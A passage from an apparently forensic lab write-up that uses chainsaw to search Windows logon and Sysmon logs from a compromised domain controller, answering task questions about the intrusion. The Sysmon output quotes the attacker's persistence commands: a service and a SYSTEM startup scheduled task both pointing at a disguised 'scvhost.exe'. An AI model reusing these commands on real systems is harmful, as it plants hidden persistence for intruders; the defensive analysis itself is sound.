    TargetUserName: Administrator
    LogonType: 7
    TargetUserName: Administrator
    TargetUserName: Administrator
    TargetUserName: Administrator
    TargetUserName: Administrator
    TargetUserName: Administrator
    TargetUserName: Administrator
      SystemTime: 2025-05-25T04:13:13.179472Z
    TargetUserName: Administrator
    TargetUserName: Administrator
      SystemTime: 2025-05-25T04:34:01.312119Z
    TargetUserName: administrator
      SystemTime: 2025-05-25T04:34:01.312634Z
    TargetUserName: Administrator
    LogonType: 3
    TargetUserName: Administrator
      SystemTime: 2025-05-25T04:37:11.521576Z
    TargetUserName: administrator
      SystemTime: 2025-05-25T04:37:11.522135Z
    TargetUserName: Administrator
    LogonType: 3
      SystemTime: 2025-05-25T04:38:09.019903Z
    TargetUserName: Administrator
    LogonType: 3
      SystemTime: 2025-05-25T04:38:09.026858Z
    TargetUserName: administrator
      SystemTime: 2025-05-25T04:38:09.027359Z
    TargetUserName: Administrator
    LogonType: 3
      SystemTime: 2025-05-25T04:38:52.886813Z
    TargetUserName: Administrator
    LogonType: 3
      SystemTime: 2025-05-25T04:38:52.895147Z
    TargetUserName: administrator
      SystemTime: 2025-05-25T04:38:52.895759Z
    TargetUserName: Administrator
    LogonType: 3
      SystemTime: 2025-05-25T04:40:09.095300Z
    TargetUserName: Administrator
    LogonType: 3
      SystemTime: 2025-05-25T04:40:09.101453Z
    TargetUserName: administrator
      SystemTime: 2025-05-25T04:40:09.101950Z
    TargetUserName: Administrator
    LogonType: 3
    TargetUserName: Administrator
    TargetUserName: Administrator
    TargetUserName: Administrator
      SystemTime: 2025-05-25T04:40:52.820526Z
    TargetUserName: Administrators
    TargetUserName: Administrator
      SystemTime: 2025-05-25T04:41:28.071138Z
    TargetUserName: Administrator
    LogonType: 3
      SystemTime: 2025-05-25T04:41:28.077150Z
    TargetUserName: administrator
      SystemTime: 2025-05-25T04:41:28.077738Z
    TargetUserName: Administrator
    LogonType: 3
      SystemTime: 2025-05-25T04:43:01.188483Z
    TargetUserName: Administrator
    LogonType: 3
      SystemTime: 2025-05-25T04:43:01.194904Z
    TargetUserName: administrator
      SystemTime: 2025-05-25T04:43:01.195413Z
    TargetUserName: Administrator
    LogonType: 3
      SystemTime: 2025-05-25T04:43:23.996867Z
    TargetUserName: Administrator
    LogonType: 3
      SystemTime: 2025-05-25T04:43:24.003410Z
    TargetUserName: administrator
      SystemTime: 2025-05-25T04:43:24.003975Z
    TargetUserName: Administrator
    LogonType: 3
      SystemTime: 2025-05-25T04:43:24.072797Z
    TargetUserName: Administrator
    LogonType: 3
      SystemTime: 2025-05-25T04:48:16.269872Z
    TargetUserName: Administrator
      SystemTime: 2025-05-25T04:48:16.271436Z
    TargetUserName: Administrator@MAIN.LOCAL
    TargetUserName: Administrator
    TargetUserName: Administrator
    LogonType: 7
      SystemTime: 2025-05-25T04:48:16.314060Z
    TargetUserName: Administrator
    LogonType: 7
      SystemTime: 2025-05-25T04:48:16.314328Z
    TargetUserName: Administrator
    TargetUserName: Administrator
    TargetUserName: Administrator
    TargetUserName: Administrator
      SystemTime: 2025-05-25T05:23:51.729820Z
    TargetUserName: Administrator
      SystemTime: 2025-05-25T05:23:51.745194Z
    TargetUserName: Administrator@MAIN.LOCAL
      SystemTime: 2025-05-25T05:23:51.747841Z
    TargetUserName: Administrator
    LogonType: 3
      SystemTime: 2025-05-25T05:24:31.584441Z
    TargetUserName: Administrator
    LogonType: 3
      SystemTime: 2025-05-25T05:26:04.218102Z
    TargetUserName: Administrator
    TargetUserName: Administrator
      SystemTime: 2025-05-25T05:26:43.328903Z
    TargetUserName: Administrator@MAIN.LOCAL
      SystemTime: 2025-05-25T05:26:43.330988Z
    TargetUserName: Administrator
    LogonType: 3
      SystemTime: 2025-05-25T05:28:37.273848Z
    TargetUserName: Administrator
      SystemTime: 2025-05-25T05:28:37.280890Z
    TargetUserName: Administrator@MAIN.LOCAL
      SystemTime: 2025-05-25T05:28:37.285996Z
    TargetUserName: Administrator
    LogonType: 3
      SystemTime: 2025-05-25T05:29:09.593794Z
    TargetUserName: Administrator
    LogonType: 3
      SystemTime: 2025-05-25T05:32:26.041786Z
    TargetUserName: Administrator@MAIN.LOCAL
      SystemTime: 2025-05-25T05:32:26.044134Z
    TargetUserName: Administrator
    LogonType: 3
      SystemTime: 2025-05-25T05:35:03.784871Z
    TargetUserName: Administrator
      SystemTime: 2025-05-25T05:35:03.788221Z
    TargetUserName: Administrator@MAIN.LOCAL
    TargetUserName: Administrator
    TargetUserName: Administrator
    LogonType: 7
[+] Done
      SystemTime: 2025-05-25T05:35:03.828474Z
    TargetUserName: Administrator
    LogonType: 7
      SystemTime: 2025-05-25T05:35:03.828972Z
    TargetUserName: Administrator
    TargetUserName: Administrator
```

We're searching for “Administrator” (case-insensitive). 
We filter that log to show you only what matters: the event ID (4624, which is Logon), the time (SystemTime), the user, and the logon type (LogonType).
When we run it, we can clearly see the block marked `04:34:01`.

##### Answer: `2025-05-25 04:34:01`

## TASK 14
What is the name of the service created by the attacker on DC01 for persistence?

In Windows, services are almost always created using the `sc.exe` command
```
❯ chainsaw search "sc.exe" Sysmon.evtx

 ██████╗██╗  ██╗ █████╗ ██╗███╗   ██╗███████╗ █████╗ ██╗    ██╗
██╔════╝██║  ██║██╔══██╗██║████╗  ██║██╔════╝██╔══██╗██║    ██║
██║     ███████║███████║██║██╔██╗ ██║███████╗███████║██║ █╗ ██║
██║     ██╔══██║██╔══██║██║██║╚██╗██║╚════██║██╔══██║██║███╗██║
╚██████╗██║  ██║██║  ██║██║██║ ╚████║███████║██║  ██║╚███╔███╔╝
 ╚═════╝╚═╝  ╚═╝╚═╝  ╚═╝╚═╝╚═╝  ╚═══╝╚══════╝╚═╝  ╚═╝ ╚══╝╚══╝
    By WithSecure Countercept (@FranticTyping, @AlexKornitzer)

[+] Loading forensic artefacts from: Sysmon.evtx
[+] Loaded 1 forensic files (2.1 MiB)
[+] Searching forensic artefacts...
---
Event_attributes:
  xmlns: http://schemas.microsoft.com/win/2004/08/events/event
Event:
  System:
    Provider_attributes:
      Name: Microsoft-Windows-Sysmon
      Guid: 5770385F-C22A-43E0-BF4C-06F5698FFBD9
    EventID: 1
    Version: 5
    Level: 4
    Task: 1
    Opcode: 0
    Keywords: '0x8000000000000000'
    TimeCreated_attributes:
      SystemTime: 2025-05-25T02:40:46.858776Z
    EventRecordID: 151697
    Correlation: null
    Execution_attributes:
      ProcessID: 2132
      ThreadID: 4912
    Channel: Microsoft-Windows-Sysmon/Operational
    Computer: DC01.Main.local
    Security_attributes:
      UserID: S-1-5-18
  EventData:
    RuleName: technique_id=T1059.003,technique_name=Windows Command Shell
    UtcTime: 2025-05-25 02:40:46.857
    ProcessGuid: C1728745-832E-6832-7400-000000007200
    ProcessId: 5940
    Image: C:\Windows\System32\cmd.exe
    FileVersion: 10.0.20348.1 (WinBuild.160101.0800)
    Description: Windows Command Processor
    Product: Microsoft® Windows® Operating System
    Company: Microsoft Corporation
    OriginalFileName: Cmd.Exe
    CommandLine: C:\Windows\system32\cmd.exe /c sc.exe qc npcap
    CurrentDirectory: C:\Windows\system32\
    User: NT AUTHORITY\SYSTEM
    LogonGuid: C1728745-82F2-6832-E703-000000000000
    LogonId: '0x3e7'
    TerminalSessionId: 0
    IntegrityLevel: System
    Hashes: SHA1=2ED89B5430C775306B316BA3A926D7DE4FE39FC7,MD5=E7A6B1F51EFB405287A8048CFA4690F4,SHA256=EB71EA69DD19F728AB9240565E8C7EFB59821E19E3788E289301E1E74940C208,IMPHASH=D60B77062898DC6BFAE7FE11A0F8806C
    ParentProcessGuid: C1728745-8305-6832-3500-000000007200
    ParentProcessId: 2628
    ParentImage: C:\Windows\System32\cmd.exe
    ParentCommandLine: C:\Windows\SYSTEM32\cmd.exe /c "C:\Program Files\Npcap\CheckStatus.bat"
    ParentUser: NT AUTHORITY\SYSTEM

---
Event_attributes:
  xmlns: http://schemas.microsoft.com/win/2004/08/events/event
Event:
  System:
    Provider_attributes:
      Name: Microsoft-Windows-Sysmon
      Guid: 5770385F-C22A-43E0-BF4C-06F5698FFBD9
    EventID: 1
    Version: 5
    Level: 4
    Task: 1
    Opcode: 0
    Keywords: '0x8000000000000000'
    TimeCreated_attributes:
      SystemTime: 2025-05-25T02:40:47.871863Z
    EventRecordID: 151698
    Correlation: null
    Execution_attributes:
      ProcessID: 2132
      ThreadID: 4912
    Channel: Microsoft-Windows-Sysmon/Operational
    Computer: DC01.Main.local
    Security_attributes:
      UserID: S-1-5-18
  EventData:
    RuleName: technique_id=T1543.003,technique_name=Windows Service
    UtcTime: 2025-05-25 02:40:47.847
    ProcessGuid: C1728745-832F-6832-7800-000000007200
    ProcessId: 6096
    Image: C:\Windows\System32\sc.exe
    FileVersion: 10.0.20348.1 (WinBuild.160101.0800)
    Description: Service Control Manager Configuration Tool
    Product: Microsoft® Windows® Operating System
    Company: Microsoft Corporation
    OriginalFileName: sc.exe
    CommandLine: sc.exe  qc npcap
    CurrentDirectory: C:\Windows\system32\
    User: NT AUTHORITY\SYSTEM
    LogonGuid: C1728745-82F2-6832-E703-000000000000
    LogonId: '0x3e7'
    TerminalSessionId: 0
    IntegrityLevel: System
    Hashes: SHA1=75881652F0F9384DE229AB396BF27F1DDA244BBC,MD5=6FB10CD439B40D92935F8F6A0C99670A,SHA256=2BF663EA493CDC21AD33AEBD8DA40CC5D2AFA55E24F9E1BBF3D73E99DCADF693,IMPHASH=803254E010814E69947095A2725B2AFD
    ParentProcessGuid: C1728745-832E-6832-7400-000000007200
    ParentProcessId: 5940
    ParentImage: C:\Windows\System32\cmd.exe
    ParentCommandLine: C:\Windows\system32\cmd.exe /c sc.exe qc npcap
    ParentUser: NT AUTHORITY\SYSTEM

---
Event_attributes:
  xmlns: http://schemas.microsoft.com/win/2004/08/events/event
Event:
  System:
    Provider_attributes:
      Name: Microsoft-Windows-Sysmon
      Guid: 5770385F-C22A-43E0-BF4C-06F5698FFBD9
    EventID: 1
    Version: 5
    Level: 4
    Task: 1
    Opcode: 0
    Keywords: '0x8000000000000000'
    TimeCreated_attributes:
      SystemTime: 2025-05-25T04:43:01.270199Z
    EventRecordID: 152659
    Correlation: null
    Execution_attributes:
      ProcessID: 2132
      ThreadID: 4912
    Channel: Microsoft-Windows-Sysmon/Operational
    Computer: DC01.Main.local
    Security_attributes:
      UserID: S-1-5-18
  EventData:
    RuleName: technique_id=T1543.003,technique_name=Windows Service
    UtcTime: 2025-05-25 04:43:01.264
    ProcessGuid: C1728745-9FD5-6832-4701-000000007200
    ProcessId: 6232
    Image: C:\Windows\System32\sc.exe
    FileVersion: 10.0.20348.1 (WinBuild.160101.0800)
    Description: Service Control Manager Configuration Tool
    Product: Microsoft® Windows® Operating System
    Company: Microsoft Corporation
    OriginalFileName: sc.exe
    CommandLine: '"C:\Windows\system32\sc.exe" create WindowsUpdateSvc binPath= C:\Windows\System32\scvhost.exe start= auto'
    CurrentDirectory: C:\Users\Administrator\Documents\
    User: MAIN\Administrator
    LogonGuid: C1728745-9DB9-6832-21CE-3C0000000000
    LogonId: '0x3cce21'
    TerminalSessionId: 0
    IntegrityLevel: High
    Hashes: SHA1=75881652F0F9384DE229AB396BF27F1DDA244BBC,MD5=6FB10CD439B40D92935F8F6A0C99670A,SHA256=2BF663EA493CDC21AD33AEBD8DA40CC5D2AFA55E24F9E1BBF3D73E99DCADF693,IMPHASH=803254E010814E69947095A2725B2AFD
    ParentProcessGuid: C1728745-9DB9-6832-3201-000000007200
    ParentProcessId: 2748
    ParentImage: C:\Windows\System32\wsmprovhost.exe
    ParentCommandLine: C:\Windows\system32\wsmprovhost.exe -Embedding
    ParentUser: MAIN\Administrator

---
Event_attributes:
  xmlns: http://schemas.microsoft.com/win/2004/08/events/event
Event:
  System:
    Provider_attributes:
      Name: Microsoft-Windows-Sysmon
      Guid: 5770385F-C22A-43E0-BF4C-06F5698FFBD9
    EventID: 10
    Version: 3
    Level: 4
    Task: 10
    Opcode: 0
    Keywords: '0x8000000000000000'
    TimeCreated_attributes:
      SystemTime: 2025-05-25T04:43:01.270569Z
    EventRecordID: 152660
    Correlation: null
    Execution_attributes:
      ProcessID: 2132
      ThreadID: 4912
    Channel: Microsoft-Windows-Sysmon/Operational
    Computer: DC01.Main.local
    Security_attributes:
      UserID: S-1-5-18
  EventData:
    RuleName: technique_id=T1055.001,technique_name=Dynamic-link Library Injection
    UtcTime: 2025-05-25 04:43:01.256
    SourceProcessGUID: C1728745-9DB9-6832-3201-000000007200
    SourceProcessId: 2748
    SourceThreadId: 4116
    SourceImage: C:\Windows\system32\wsmprovhost.exe
    TargetProcessGUID: C1728745-9FD5-6832-4701-000000007200
    TargetProcessId: 6232
    TargetImage: C:\Windows\system32\sc.exe
    GrantedAccess: '0x1fffff'
    CallTrace: C:\Windows\SYSTEM32\ntdll.dll+a0864|C:\Windows\System32\KERNELBASE.dll+31a89|C:\Windows\System32\KERNELBASE.dll+80fb6|C:\Windows\System32\KERNEL32.DLL+1c7c4|C:\Windows\assembly\NativeImages_v4.0.30319_64\System\18195476b780b04f355b39f48f10cc25\System.ni.dll+384146|C:\Windows\assembly\NativeImages_v4.0.30319_64\System\18195476b780b04f355b39f48f10cc25\System.ni.dll+2c4809|C:\Windows\assembly\NativeImages_v4.0.30319_64\System\18195476b780b04f355b39f48f10cc25\System.ni.dll+2c4179|C:\Windows\assembly\NativeImages_v4.0.30319_64\System.Manaa57fc8cc#\a3bcadd89102c16f39eea68579b45e51\System.Management.Automation.ni.dll+111f089|C:\Windows\assembly\NativeImages_v4.0.30319_64\System.Manaa57fc8cc#\a3bcadd89102c16f39eea68579b45e51\System.Management.Automation.ni.dll+10762da|C:\Windows\assembly\NativeImages_v4.0.30319_64\System.Manaa57fc8cc#\a3bcadd89102c16f39eea68579b45e51\System.Management.Automation.ni.dll+110096d|C:\Windows\assembly\NativeImages_v4.0.30319_64\System.Manaa57fc8cc#\a3bcadd89102c16f39eea68579b45e51\System.Management.Automation.ni.dll+110062b|C:\Windows\assembly\NativeImages_v4.0.30319_64\System.Manaa57fc8cc#\a3bcadd89102c16f39eea68579b45e51\System.Management.Automation.ni.dll+1203a8f|UNKNOWN(00007FF9032640D1)
    SourceUser: MAIN\Administrator
    TargetUser: MAIN\Administrator

[+] Found 4 hits
```

The attacker has named the file `scvhost.exe` (with the characters 'v' and 'c' swapped). The legitimate Windows file is `svchost.exe`. This is an attempt to fool the human eye. It happens right after the administrator logs in. Also, the service name is `WindowsUpdateSvc`

##### Answer: `WindowsUpdateSvc`

## TASK 15
What is the name of the scheduled task created by the attacker on DC01 for persistence?

If the service fails or is detected, the scheduled task will re-execute the malware at regular intervals or upon login.

```
❯ chainsaw search "schtasks.exe" Sysmon.evtx

 ██████╗██╗  ██╗ █████╗ ██╗███╗   ██╗███████╗ █████╗ ██╗    ██╗
██╔════╝██║  ██║██╔══██╗██║████╗  ██║██╔════╝██╔══██╗██║    ██║
██║     ███████║███████║██║██╔██╗ ██║███████╗███████║██║ █╗ ██║
██║     ██╔══██║██╔══██║██║██║╚██╗██║╚════██║██╔══██║██║███╗██║
╚██████╗██║  ██║██║  ██║██║██║ ╚████║███████║██║  ██║╚███╔███╔╝
 ╚═════╝╚═╝  ╚═╝╚═╝  ╚═╝╚═╝╚═╝  ╚═══╝╚══════╝╚═╝  ╚═╝ ╚══╝╚══╝
    By WithSecure Countercept (@FranticTyping, @AlexKornitzer)

[+] Loading forensic artefacts from: Sysmon.evtx
[+] Loaded 1 forensic files (2.1 MiB)
[+] Searching forensic artefacts...
---
Event_attributes:
  xmlns: http://schemas.microsoft.com/win/2004/08/events/event
Event:
  System:
    Provider_attributes:
      Name: Microsoft-Windows-Sysmon
      Guid: 5770385F-C22A-43E0-BF4C-06F5698FFBD9
    EventID: 1
    Version: 5
    Level: 4
    Task: 1
    Opcode: 0
    Keywords: '0x8000000000000000'
    TimeCreated_attributes:
      SystemTime: 2025-05-25T04:38:19.863742Z
    EventRecordID: 152597
    Correlation: null
    Execution_attributes:
      ProcessID: 2132
      ThreadID: 4912
    Channel: Microsoft-Windows-Sysmon/Operational
    Computer: DC01.Main.local
    Security_attributes:
      UserID: S-1-5-18
  EventData:
    RuleName: technique_id=T1053.005,technique_name=Scheduled Task/Job
    UtcTime: 2025-05-25 04:38:19.761
    ProcessGuid: C1728745-9EBB-6832-3501-000000007200
    ProcessId: 5840
    Image: C:\Windows\System32\schtasks.exe
    FileVersion: 10.0.20348.1 (WinBuild.160101.0800)
    Description: Task Scheduler Configuration Tool
    Product: Microsoft® Windows® Operating System
    Company: Microsoft Corporation
    OriginalFileName: schtasks.exe
    CommandLine: '"C:\Windows\system32\schtasks.exe" /query'
    CurrentDirectory: C:\Users\Administrator\Documents\
    User: MAIN\Administrator
    LogonGuid: C1728745-9DB9-6832-21CE-3C0000000000
    LogonId: '0x3cce21'
    TerminalSessionId: 0
    IntegrityLevel: High
    Hashes: SHA1=C7548A5CBF90C68A1396147BF7B9E878C7DF8B4C,MD5=A5C613AE2541EE5FFB83E2882DC148C2,SHA256=7AFCC83C671A6142996A2F6BE94D533D000D943A8BA2293851A4232B76FA29AD,IMPHASH=44E70F20C235C150D75F6FC8B1E29CD1
    ParentProcessGuid: C1728745-9DB9-6832-3201-000000007200
    ParentProcessId: 2748
    ParentImage: C:\Windows\System32\wsmprovhost.exe
    ParentCommandLine: C:\Windows\system32\wsmprovhost.exe -Embedding
    ParentUser: MAIN\Administrator

---
Event_attributes:
  xmlns: http://schemas.microsoft.com/win/2004/08/events/event
Event:
  System:
    Provider_attributes:
      Name: Microsoft-Windows-Sysmon
      Guid: 5770385F-C22A-43E0-BF4C-06F5698FFBD9
    EventID: 10
    Version: 3
    Level: 4
    Task: 10
    Opcode: 0
    Keywords: '0x8000000000000000'
    TimeCreated_attributes:
      SystemTime: 2025-05-25T04:38:19.863904Z
    EventRecordID: 152598
    Correlation: null
    Execution_attributes:
      ProcessID: 2132
      ThreadID: 4912
    Channel: Microsoft-Windows-Sysmon/Operational
    Computer: DC01.Main.local
    Security_attributes:
      UserID: S-1-5-18
  EventData:
    RuleName: technique_id=T1055.001,technique_name=Dynamic-link Library Injection
    UtcTime: 2025-05-25 04:38:19.856
    SourceProcessGUID: C1728745-9DB9-6832-3201-000000007200
    SourceProcessId: 2748
    SourceThreadId: 4116
    SourceImage: C:\Windows\system32\wsmprovhost.exe
    TargetProcessGUID: C1728745-9EBB-6832-3501-000000007200
    TargetProcessId: 5840
    TargetImage: C:\Windows\system32\schtasks.exe
    GrantedAccess: '0x1fffff'
    CallTrace: C:\Windows\SYSTEM32\ntdll.dll+a0864|C:\Windows\System32\KERNELBASE.dll+31a89|C:\Windows\System32\KERNELBASE.dll+80fb6|C:\Windows\System32\KERNEL32.DLL+1c7c4|C:\Windows\assembly\NativeImages_v4.0.30319_64\System\18195476b780b04f355b39f48f10cc25\System.ni.dll+384146|C:\Windows\assembly\NativeImages_v4.0.30319_64\System\18195476b780b04f355b39f48f10cc25\System.ni.dll+2c4809|C:\Windows\assembly\NativeImages_v4.0.30319_64\System\18195476b780b04f355b39f48f10cc25\System.ni.dll+2c4179|C:\Windows\assembly\NativeImages_v4.0.30319_64\System.Manaa57fc8cc#\a3bcadd89102c16f39eea68579b45e51\System.Management.Automation.ni.dll+111f089|C:\Windows\assembly\NativeImages_v4.0.30319_64\System.Manaa57fc8cc#\a3bcadd89102c16f39eea68579b45e51\System.Management.Automation.ni.dll+10762da|C:\Windows\assembly\NativeImages_v4.0.30319_64\System.Manaa57fc8cc#\a3bcadd89102c16f39eea68579b45e51\System.Management.Automation.ni.dll+110096d|C:\Windows\assembly\NativeImages_v4.0.30319_64\System.Manaa57fc8cc#\a3bcadd89102c16f39eea68579b45e51\System.Management.Automation.ni.dll+110062b|C:\Windows\assembly\NativeImages_v4.0.30319_64\System.Manaa57fc8cc#\a3bcadd89102c16f39eea68579b45e51\System.Management.Automation.ni.dll+1203a8f|UNKNOWN(00007FF9032640D1)
    SourceUser: MAIN\Administrator
    TargetUser: MAIN\Administrator

---
Event_attributes:
  xmlns: http://schemas.microsoft.com/win/2004/08/events/event
Event:
  System:
    Provider_attributes:
      Name: Microsoft-Windows-Sysmon
      Guid: 5770385F-C22A-43E0-BF4C-06F5698FFBD9
    EventID: 7
    Version: 3
    Level: 4
    Task: 7
    Opcode: 0
    Keywords: '0x8000000000000000'
    TimeCreated_attributes:
      SystemTime: 2025-05-25T04:38:20.037077Z
    EventRecordID: 152599
    Correlation: null
    Execution_attributes:
      ProcessID: 2132
      ThreadID: 4912
    Channel: Microsoft-Windows-Sysmon/Operational
    Computer: DC01.Main.local
    Security_attributes:
      UserID: S-1-5-18
  EventData:
    RuleName: technique_id=T1053,technique_name=Scheduled Task
    UtcTime: 2025-05-25 04:38:20.027
    ProcessGuid: C1728745-9EBB-6832-3501-000000007200
    ProcessId: 5840
    Image: C:\Windows\System32\schtasks.exe
    ImageLoaded: C:\Windows\System32\taskschd.dll
    FileVersion: 10.0.20348.1 (WinBuild.160101.0800)
    Description: Task Scheduler COM API
    Product: Microsoft® Windows® Operating System
    Company: Microsoft Corporation
    OriginalFileName: taskschd.dll
    Hashes: SHA1=F7151ED9C53B2095B2FF1294971C63C6F4739167,MD5=1A49668C0AD5E92F0CEF9F0EF99607A9,SHA256=98920100ECE3236CB579E24DB926CA66ACB05F7018F85DD9C40C1865F86D9041,IMPHASH=530A68E05D91DD5F4F3210E15EFA9CB5
    Signed: 'true'
    Signature: Microsoft Windows
    SignatureStatus: Valid
    User: MAIN\Administrator

---
Event_attributes:
  xmlns: http://schemas.microsoft.com/win/2004/08/events/event
Event:
  System:
    Provider_attributes:
      Name: Microsoft-Windows-Sysmon
      Guid: 5770385F-C22A-43E0-BF4C-06F5698FFBD9
    EventID: 1
    Version: 5
    Level: 4
    Task: 1
    Opcode: 0
    Keywords: '0x8000000000000000'
    TimeCreated_attributes:
      SystemTime: 2025-05-25T04:38:53.022639Z
    EventRecordID: 152600
    Correlation: null
    Execution_attributes:
      ProcessID: 2132
      ThreadID: 4912
    Channel: Microsoft-Windows-Sysmon/Operational
    Computer: DC01.Main.local
    Security_attributes:
      UserID: S-1-5-18
  EventData:
    RuleName: technique_id=T1053.005,technique_name=Scheduled Task/Job
    UtcTime: 2025-05-25 04:38:53.011
    ProcessGuid: C1728745-9EDD-6832-3701-000000007200
    ProcessId: 1216
    Image: C:\Windows\System32\schtasks.exe
    FileVersion: 10.0.20348.1 (WinBuild.160101.0800)
    Description: Task Scheduler Configuration Tool
    Product: Microsoft® Windows® Operating System
    Company: Microsoft Corporation
    OriginalFileName: schtasks.exe
    CommandLine: '"C:\Windows\system32\schtasks.exe" /create /tn WindowsUpdateCheck /tr C:\Windows\System32\scvhost.exe /sc onstart /ru SYSTEM /f'
    CurrentDirectory: C:\Users\Administrator\Documents\
    User: MAIN\Administrator
    LogonGuid: C1728745-9DB9-6832-21CE-3C0000000000
    LogonId: '0x3cce21'
    TerminalSessionId: 0
    IntegrityLevel: High
    Hashes: SHA1=C7548A5CBF90C68A1396147BF7B9E878C7DF8B4C,MD5=A5C613AE2541EE5FFB83E2882DC148C2,SHA256=7AFCC83C671A6142996A2F6BE94D533D000D943A8BA2293851A4232B76FA29AD,IMPHASH=44E70F20C235C150D75F6FC8B1E29CD1
    ParentProcessGuid: C1728745-9DB9-6832-3201-000000007200
    ParentProcessId: 2748
    ParentImage: C:\Windows\System32\wsmprovhost.exe
    ParentCommandLine: C:\Windows\system32\wsmprovhost.exe -Embedding
    ParentUser: MAIN\Administrator

---
Event_attributes:
  xmlns: http://schemas.microsoft.com/win/2004/08/events/event
Event:
  System:
    Provider_attributes:
      Name: Microsoft-Windows-Sysmon
      Guid: 5770385F-C22A-43E0-BF4C-06F5698FFBD9
    EventID: 10
    Version: 3
    Level: 4
    Task: 10
    Opcode: 0
    Keywords: '0x8000000000000000'
    TimeCreated_attributes:
      SystemTime: 2025-05-25T04:38:53.022784Z
    EventRecordID: 152601
    Correlation: null
    Execution_attributes:
      ProcessID: 2132
      ThreadID: 4912
    Channel: Microsoft-Windows-Sysmon/Operational
    Computer: DC01.Main.local
    Security_attributes:
      UserID: S-1-5-18
  EventData:
    RuleName: technique_id=T1055.001,technique_name=Dynamic-link Library Injection
    UtcTime: 2025-05-25 04:38:53.016
    SourceProcessGUID: C1728745-9DB9-6832-3201-000000007200
    SourceProcessId: 2748
    SourceThreadId: 4116
    SourceImage: C:\Windows\system32\wsmprovhost.exe
    TargetProcessGUID: C1728745-9EDD-6832-3701-000000007200
    TargetProcessId: 1216
    TargetImage: C:\Windows\system32\schtasks.exe
    GrantedAccess: '0x1fffff'
    CallTrace: C:\Windows\SYSTEM32\ntdll.dll+a0864|C:\Windows\System32\KERNELBASE.dll+31a89|C:\Windows\System32\KERNELBASE.dll+80fb6|C:\Windows\System32\KERNEL32.DLL+1c7c4|C:\Windows\assembly\NativeImages_v4.0.30319_64\System\18195476b780b04f355b39f48f10cc25\System.ni.dll+384146|C:\Windows\assembly\NativeImages_v4.0.30319_64\System\18195476b780b04f355b39f48f10cc25\System.ni.dll+2c4809|C:\Windows\assembly\NativeImages_v4.0.30319_64\System\18195476b780b04f355b39f48f10cc25\System.ni.dll+2c4179|C:\Windows\assembly\NativeImages_v4.0.30319_64\System.Manaa57fc8cc#\a3bcadd89102c16f39eea68579b45e51\System.Management.Automation.ni.dll+111f089|C:\Windows\assembly\NativeImages_v4.0.30319_64\System.Manaa57fc8cc#\a3bcadd89102c16f39eea68579b45e51\System.Management.Automation.ni.dll+10762da|C:\Windows\assembly\NativeImages_v4.0.30319_64\System.Manaa57fc8cc#\a3bcadd89102c16f39eea68579b45e51\System.Management.Automation.ni.dll+110096d|C:\Windows\assembly\NativeImages_v4.0.30319_64\System.Manaa57fc8cc#\a3bcadd89102c16f39eea68579b45e51\System.Management.Automation.ni.dll+110062b|C:\Windows\assembly\NativeImages_v4.0.30319_64\System.Manaa57fc8cc#\a3bcadd89102c16f39eea68579b45e51\System.Management.Automation.ni.dll+1203a8f|UNKNOWN(00007FF9032640D1)
    SourceUser: MAIN\Administrator
    TargetUser: MAIN\Administrator

---
Event_attributes:
  xmlns: http://schemas.microsoft.com/win/2004/08/events/event
Event:
  System:
    Provider_attributes:
      Name: Microsoft-Windows-Sysmon
      Guid: 5770385F-C22A-43E0-BF4C-06F5698FFBD9
    EventID: 7
    Version: 3
    Level: 4
    Task: 7
    Opcode: 0
    Keywords: '0x8000000000000000'
    TimeCreated_attributes:
      SystemTime: 2025-05-25T04:38:53.093065Z
    EventRecordID: 152602
    Correlation: null
    Execution_attributes:
      ProcessID: 2132
      ThreadID: 4912
    Channel: Microsoft-Windows-Sysmon/Operational
    Computer: DC01.Main.local
    Security_attributes:
      UserID: S-1-5-18
  EventData:
    RuleName: technique_id=T1053,technique_name=Scheduled Task
    UtcTime: 2025-05-25 04:38:53.079
    ProcessGuid: C1728745-9EDD-6832-3701-000000007200
    ProcessId: 1216
    Image: C:\Windows\System32\schtasks.exe
    ImageLoaded: C:\Windows\System32\taskschd.dll
    FileVersion: 10.0.20348.1 (WinBuild.160101.0800)
    Description: Task Scheduler COM API
    Product: Microsoft® Windows® Operating System
    Company: Microsoft Corporation
    OriginalFileName: taskschd.dll
    Hashes: SHA1=F7151ED9C53B2095B2FF1294971C63C6F4739167,MD5=1A49668C0AD5E92F0CEF9F0EF99607A9,SHA256=98920100ECE3236CB579E24DB926CA66ACB05F7018F85DD9C40C1865F86D9041,IMPHASH=530A68E05D91DD5F4F3210E15EFA9CB5
    Signed: 'true'
    Signature: Microsoft Windows
    SignatureStatus: Valid
    User: MAIN\Administrator

---
Event_attributes:
  xmlns: http://schemas.microsoft.com/win/2004/08/events/event
Event:
  System:
    Provider_attributes:
      Name: Microsoft-Windows-Sysmon
      Guid: 5770385F-C22A-43E0-BF4C-06F5698FFBD9
    EventID: 1
    Version: 5
    Level: 4
    Task: 1
    Opcode: 0
    Keywords: '0x8000000000000000'
    TimeCreated_attributes:
      SystemTime: 2025-05-25T04:38:59.849731Z
    EventRecordID: 152609
    Correlation: null
    Execution_attributes:
      ProcessID: 2132
      ThreadID: 4912
    Channel: Microsoft-Windows-Sysmon/Operational
    Computer: DC01.Main.local
    Security_attributes:
      UserID: S-1-5-18
  EventData:
    RuleName: technique_id=T1053.005,technique_name=Scheduled Task/Job
    UtcTime: 2025-05-25 04:38:59.837
    ProcessGuid: C1728745-9EE3-6832-3901-000000007200
    ProcessId: 316
    Image: C:\Windows\System32\schtasks.exe
    FileVersion: 10.0.20348.1 (WinBuild.160101.0800)
    Description: Task Scheduler Configuration Tool
    Product: Microsoft® Windows® Operating System
    Company: Microsoft Corporation
    OriginalFileName: schtasks.exe
    CommandLine: '"C:\Windows\system32\schtasks.exe" /query /tn WindowsUpdateCheck'
    CurrentDirectory: C:\Users\Administrator\Documents\
    User: MAIN\Administrator
    LogonGuid: C1728745-9DB9-6832-21CE-3C0000000000
    LogonId: '0x3cce21'
    TerminalSessionId: 0
    IntegrityLevel: High
    Hashes: SHA1=C7548A5CBF90C68A1396147BF7B9E878C7DF8B4C,MD5=A5C613AE2541EE5FFB83E2882DC148C2,SHA256=7AFCC83C671A6142996A2F6BE94D533D000D943A8BA2293851A4232B76FA29AD,IMPHASH=44E70F20C235C150D75F6FC8B1E29CD1
    ParentProcessGuid: C1728745-9DB9-6832-3201-000000007200
    ParentProcessId: 2748
    ParentImage: C:\Windows\System32\wsmprovhost.exe
    ParentCommandLine: C:\Windows\system32\wsmprovhost.exe -Embedding
    ParentUser: MAIN\Administrator

---
Event_attributes:
  xmlns: http://schemas.microsoft.com/win/2004/08/events/event
Event:
  System:
    Provider_attributes:
      Name: Microsoft-Windows-Sysmon
